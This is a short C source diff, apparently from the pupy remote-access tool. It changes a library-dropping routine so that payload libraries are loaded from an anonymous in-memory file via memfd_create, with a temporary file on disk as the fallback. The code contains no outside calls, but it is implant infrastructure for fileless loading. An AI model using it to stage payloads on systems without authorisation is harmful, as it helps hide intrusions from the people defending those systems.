@@ -14,6 +14,8 @@
 #include "tmplibrary.h"
 #include "debug.h"
 
+#include "memfd.h"
+
 #include "decompress.h"
 
 /*
@@ -99,16 +101,25 @@ bool search_library(void *pState, void *pData) {
 }
 
 bool drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
-	const char *template = gettemptpl();
+	int fd = pupy_memfd_create(path, path_size);
+	bool closefd = false;
 
-	if (path_size < strlen(template))
-		return false;
-
-	strcpy(path, template);
-
-	int fd = mkstemp(path);
 	if (fd == -1) {
-		return false;
+		dprint("pupy_memfd_create() failed: %m\n");
+
+		const char *template = gettemptpl();
+
+		if (path_size < strlen(template))
+			return false;
+
+		strcpy(path, template);
+
+		fd = mkstemp(path);
+		if (fd == -1) {
+			return false;
+		}
+
+		closefd = true;
 	}
 
 	bool result = true;
@@ -134,7 +145,10 @@ bool drop_library(char *path, size_t path_size, const char *buffer, size_t size)
 		}
 	}
 
-	close(fd);
+	if (closefd) {
+		dprint("Closing temporary fd: %d\n", fd);
+		close(fd);
+	}
 
 	return result;
 }
